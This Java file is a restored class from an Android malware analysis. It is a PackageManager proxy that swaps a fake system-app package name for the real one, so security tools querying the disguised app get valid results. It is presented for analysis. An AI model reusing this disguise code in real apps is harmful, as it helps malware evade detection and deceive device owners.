package hook;

import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.ChangedPackages;
import android.content.pm.FeatureInfo;
import android.content.pm.InstrumentationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.content.pm.PermissionGroupInfo;
import android.content.pm.PermissionInfo;
import android.content.pm.ProviderInfo;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.content.pm.SharedLibraryInfo;
import android.content.pm.VersionedPackage;
import android.content.res.Resources;
import android.content.res.XmlResourceParser;
import android.graphics.Rect;
import android.graphics.drawable.Drawable;
import android.os.UserHandle;
import java.util.List;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: IlIllll1/llllIllIl1
 *
 * Proxy around the real PackageManager that intercepts two key methods to
 * maintain the package name disguise. When security tools query package
 * info using the fake package name (obtained from the hooked getPackageName()),
 * this proxy transparently substitutes the real package name to ensure
 * valid results are returned.
 *
 * Only getPackageInfo() and getInstallerPackageName() perform substitution.
 * All other ~40 methods are simple transparent delegations to the real
 * PackageManager.
 *
 * Original obfuscated name: IlIllll1.llllIllIl1
 */
public class PackageManagerProxy extends PackageManager {

    /** The real system PackageManager */
    public PackageManager realPM;

    /** Fake package name (randomly selected system app name) */
    public final String fakePackageName = HookConfig.fakePackageName;

    /** Real package name ("com.android.wallpaper") */
    public final String realPackageName = HookConfig.realPackageName;

    public PackageManagerProxy(PackageManager packageManager) {
        this.realPM = packageManager;
    }

    // =========================================================================
    // Key intercepted methods — package name substitution
    // =========================================================================

    /**
     * Intercepts package info queries. When a security tool uses the fake
     * package name (obtained from the hooked getPackageName()), this method
     * substitutes the real package name so the query returns valid results
     * (correct signature, permissions, etc.) instead of NameNotFoundException.
     */
    @Override
    public PackageInfo getPackageInfo(String packageName, int flags)
            throws NameNotFoundException {
        if (packageName != null && packageName.equals(this.fakePackageName)) {
            packageName = this.realPackageName;
        }
        return this.realPM.getPackageInfo(packageName, flags);
    }

    /**
     * Intercepts installer package name queries. Same substitution logic:
     * if the security tool asks for the installer of the fake package name,
     * we query with the real name instead to return a valid result.
     */
    @Override
    public String getInstallerPackageName(String packageName) {
        if (packageName != null && packageName.equals(this.fakePackageName)) {
            packageName = this.realPackageName;
        }
        return this.realPM.getInstallerPackageName(packageName);
    }

    // =========================================================================
    // ~40 other PackageManager methods — all transparent delegations to realPM.
    // Only stubs shown here for compilation; each simply calls through to
    // this.realPM.<method>(...) with unmodified arguments.
    // =========================================================================

    @Override public PackageInfo getPackageInfo(VersionedPackage vp, int flags) throws NameNotFoundException { return this.realPM.getPackageInfo(vp, flags); }
    @Override public String[] currentToCanonicalPackageNames(String[] names) { return this.realPM.currentToCanonicalPackageNames(names); }
    @Override public String[] canonicalToCurrentPackageNames(String[] names) { return this.realPM.canonicalToCurrentPackageNames(names); }
    @Override public Intent getLaunchIntentForPackage(String pkg) { return this.realPM.getLaunchIntentForPackage(pkg); }
    @Override public Intent getLeanbackLaunchIntentForPackage(String pkg) { return this.realPM.getLeanbackLaunchIntentForPackage(pkg); }
    @Override public int[] getPackageGids(String pkg) throws NameNotFoundException { return this.realPM.getPackageGids(pkg); }
    @Override public int[] getPackageGids(String pkg, int flags) throws NameNotFoundException { return this.realPM.getPackageGids(pkg, flags); }
    @Override public int getPackageUid(String pkg, int flags) throws NameNotFoundException { return this.realPM.getPackageUid(pkg, flags); }
    @Override public List<PackageInfo> getInstalledPackages(int flags) { return this.realPM.getInstalledPackages(flags); }
    @Override public List<ApplicationInfo> getInstalledApplications(int flags) { return this.realPM.getInstalledApplications(flags); }
    @Override public ApplicationInfo getApplicationInfo(String pkg, int flags) throws NameNotFoundException { return this.realPM.getApplicationInfo(pkg, flags); }
    @Override public ActivityInfo getActivityInfo(ComponentName comp, int flags) throws NameNotFoundException { return this.realPM.getActivityInfo(comp, flags); }
    @Override public ActivityInfo getReceiverInfo(ComponentName comp, int flags) throws NameNotFoundException { return this.realPM.getReceiverInfo(comp, flags); }
    @Override public ServiceInfo getServiceInfo(ComponentName comp, int flags) throws NameNotFoundException { return this.realPM.getServiceInfo(comp, flags); }
    @Override public ProviderInfo getProviderInfo(ComponentName comp, int flags) throws NameNotFoundException { return this.realPM.getProviderInfo(comp, flags); }
    @Override public PermissionInfo getPermissionInfo(String name, int flags) throws NameNotFoundException { return this.realPM.getPermissionInfo(name, flags); }
    @Override public List<PermissionInfo> queryPermissionsByGroup(String group, int flags) throws NameNotFoundException { return this.realPM.queryPermissionsByGroup(group, flags); }
    @Override public PermissionGroupInfo getPermissionGroupInfo(String name, int flags) throws NameNotFoundException { return this.realPM.getPermissionGroupInfo(name, flags); }
    @Override public List<PermissionGroupInfo> getAllPermissionGroups(int flags) { return this.realPM.getAllPermissionGroups(flags); }
    @Override public boolean isPermissionRevokedByPolicy(String perm, String pkg) { return this.realPM.isPermissionRevokedByPolicy(perm, pkg); }
    @Override public int checkPermission(String perm, String pkg) { return this.realPM.checkPermission(perm, pkg); }
    @Override public boolean addPermission(PermissionInfo info) { return this.realPM.addPermission(info); }
    @Override public boolean addPermissionAsync(PermissionInfo info) { return this.realPM.addPermissionAsync(info); }
    @Override public void removePermission(String name) { this.realPM.removePermission(name); }
    @Override public int checkSignatures(String pkg1, String pkg2) { return this.realPM.checkSignatures(pkg1, pkg2); }
    @Override public int checkSignatures(int uid1, int uid2) { return this.realPM.checkSignatures(uid1, uid2); }
    @Override public String[] getPackagesForUid(int uid) { return this.realPM.getPackagesForUid(uid); }
    @Override public String getNameForUid(int uid) { return this.realPM.getNameForUid(uid); }
    @Override public List<ResolveInfo> queryIntentActivities(Intent intent, int flags) { return this.realPM.queryIntentActivities(intent, flags); }
    @Override public List<ResolveInfo> queryIntentActivityOptions(ComponentName caller, Intent[] specifics, Intent intent, int flags) { return this.realPM.queryIntentActivityOptions(caller, specifics, intent, flags); }
    @Override public List<ResolveInfo> queryBroadcastReceivers(Intent intent, int flags) { return this.realPM.queryBroadcastReceivers(intent, flags); }
    @Override public ResolveInfo resolveActivity(Intent intent, int flags) { return this.realPM.resolveActivity(intent, flags); }
    @Override public ResolveInfo resolveService(Intent intent, int flags) { return this.realPM.resolveService(intent, flags); }
    @Override public List<ResolveInfo> queryIntentServices(Intent intent, int flags) { return this.realPM.queryIntentServices(intent, flags); }
    @Override public List<ResolveInfo> queryIntentContentProviders(Intent intent, int flags) { return this.realPM.queryIntentContentProviders(intent, flags); }
    @Override public ProviderInfo resolveContentProvider(String name, int flags) { return this.realPM.resolveContentProvider(name, flags); }
    @Override public List<ProviderInfo> queryContentProviders(String processName, int uid, int flags) { return this.realPM.queryContentProviders(processName, uid, flags); }
    @Override public InstrumentationInfo getInstrumentationInfo(ComponentName comp, int flags) throws NameNotFoundException { return this.realPM.getInstrumentationInfo(comp, flags); }
    @Override public List<InstrumentationInfo> queryInstrumentation(String targetPkg, int flags) { return this.realPM.queryInstrumentation(targetPkg, flags); }
    @Override public Drawable getDrawable(String pkg, int resId, ApplicationInfo info) { return this.realPM.getDrawable(pkg, resId, info); }
    @Override public Drawable getActivityIcon(ComponentName comp) throws NameNotFoundException { return this.realPM.getActivityIcon(comp); }
    @Override public Drawable getActivityIcon(Intent intent) throws NameNotFoundException { return this.realPM.getActivityIcon(intent); }
    @Override public Drawable getActivityBanner(ComponentName comp) throws NameNotFoundException { return this.realPM.getActivityBanner(comp); }
    @Override public Drawable getActivityBanner(Intent intent) throws NameNotFoundException { return this.realPM.getActivityBanner(intent); }
    @Override public Drawable getDefaultActivityIcon() { return this.realPM.getDefaultActivityIcon(); }
    @Override public Drawable getApplicationIcon(ApplicationInfo info) { return this.realPM.getApplicationIcon(info); }
    @Override public Drawable getApplicationIcon(String pkg) throws NameNotFoundException { return this.realPM.getApplicationIcon(pkg); }
    @Override public Drawable getApplicationBanner(ApplicationInfo info) { return this.realPM.getApplicationBanner(info); }
    @Override public Drawable getApplicationBanner(String pkg) throws NameNotFoundException { return this.realPM.getApplicationBanner(pkg); }
    @Override public Drawable getActivityLogo(ComponentName comp) throws NameNotFoundException { return this.realPM.getActivityLogo(comp); }
    @Override public Drawable getActivityLogo(Intent intent) throws NameNotFoundException { return this.realPM.getActivityLogo(intent); }
    @Override public Drawable getApplicationLogo(ApplicationInfo info) { return this.realPM.getApplicationLogo(info); }
    @Override public Drawable getApplicationLogo(String pkg) throws NameNotFoundException { return this.realPM.getApplicationLogo(pkg); }
    @Override public Drawable getUserBadgedIcon(Drawable icon, UserHandle user) { return this.realPM.getUserBadgedIcon(icon, user); }
    @Override public Drawable getUserBadgedDrawableForDensity(Drawable drawable, UserHandle user, Rect badgeLocation, int badgeDensity) { return this.realPM.getUserBadgedDrawableForDensity(drawable, user, badgeLocation, badgeDensity); }
    @Override public CharSequence getUserBadgedLabel(CharSequence label, UserHandle user) { return this.realPM.getUserBadgedLabel(label, user); }
    @Override public CharSequence getText(String pkg, int resId, ApplicationInfo info) { return this.realPM.getText(pkg, resId, info); }
    @Override public XmlResourceParser getXml(String pkg, int resId, ApplicationInfo info) { return this.realPM.getXml(pkg, resId, info); }
    @Override public CharSequence getApplicationLabel(ApplicationInfo info) { return this.realPM.getApplicationLabel(info); }
    @Override public Resources getResourcesForActivity(ComponentName comp) throws NameNotFoundException { return this.realPM.getResourcesForActivity(comp); }
    @Override public Resources getResourcesForApplication(ApplicationInfo info) { return this.realPM.getResourcesForApplication(info); }
    @Override public Resources getResourcesForApplication(String pkg) throws NameNotFoundException { return this.realPM.getResourcesForApplication(pkg); }
    @Override public void verifyPendingInstall(int id, int verificationCode) { this.realPM.verifyPendingInstall(id, verificationCode); }
    @Override public void extendVerificationTimeout(int id, int verificationCodeAtTimeout, long millisecondsToDelay) { this.realPM.extendVerificationTimeout(id, verificationCodeAtTimeout, millisecondsToDelay); }
    @Override public void setInstallerPackageName(String targetPackage, String installerPackageName) { this.realPM.setInstallerPackageName(targetPackage, installerPackageName); }
    @Override public void addPackageToPreferred(String packageName) { this.realPM.addPackageToPreferred(packageName); }
    @Override public void removePackageFromPreferred(String packageName) { this.realPM.removePackageFromPreferred(packageName); }
    @Override public List<PackageInfo> getPreferredPackages(int flags) { return this.realPM.getPreferredPackages(flags); }
    @Override public void addPreferredActivity(IntentFilter filter, int match, ComponentName[] set, ComponentName activity) { this.realPM.addPreferredActivity(filter, match, set, activity); }
    @Override public void clearPackagePreferredActivities(String packageName) { this.realPM.clearPackagePreferredActivities(packageName); }
    @Override public int getPreferredActivities(List<IntentFilter> outFilters, List<ComponentName> outActivities, String packageName) { return this.realPM.getPreferredActivities(outFilters, outActivities, packageName); }
    @Override public void setComponentEnabledSetting(ComponentName comp, int newState, int flags) { this.realPM.setComponentEnabledSetting(comp, newState, flags); }
    @Override public int getComponentEnabledSetting(ComponentName comp) { return this.realPM.getComponentEnabledSetting(comp); }
    @Override public void setApplicationEnabledSetting(String packageName, int newState, int flags) { this.realPM.setApplicationEnabledSetting(packageName, newState, flags); }
    @Override public int getApplicationEnabledSetting(String packageName) { return this.realPM.getApplicationEnabledSetting(packageName); }
    @Override public boolean isSafeMode() { return this.realPM.isSafeMode(); }
    @Override public PackageInstaller getPackageInstaller() { return this.realPM.getPackageInstaller(); }
    @Override public boolean canRequestPackageInstalls() { return this.realPM.canRequestPackageInstalls(); }
    @Override public FeatureInfo[] getSystemAvailableFeatures() { return this.realPM.getSystemAvailableFeatures(); }
    @Override public boolean hasSystemFeature(String name) { return this.realPM.hasSystemFeature(name); }
    @Override public boolean hasSystemFeature(String name, int version) { return this.realPM.hasSystemFeature(name, version); }
    @Override public String[] getSystemSharedLibraryNames() { return this.realPM.getSystemSharedLibraryNames(); }
    @Override public List<SharedLibraryInfo> getSharedLibraries(int flags) { return this.realPM.getSharedLibraries(flags); }
    @Override public ChangedPackages getChangedPackages(int sequenceNumber) { return this.realPM.getChangedPackages(sequenceNumber); }
    @Override public boolean isInstantApp() { return this.realPM.isInstantApp(); }
    @Override public boolean isInstantApp(String packageName) { return this.realPM.isInstantApp(packageName); }
    @Override public int getInstantAppCookieMaxBytes() { return this.realPM.getInstantAppCookieMaxBytes(); }
    @Override public byte[] getInstantAppCookie() { return this.realPM.getInstantAppCookie(); }
    @Override public void clearInstantAppCookie() { this.realPM.clearInstantAppCookie(); }
    @Override public void updateInstantAppCookie(byte[] cookie) { this.realPM.updateInstantAppCookie(cookie); }
}
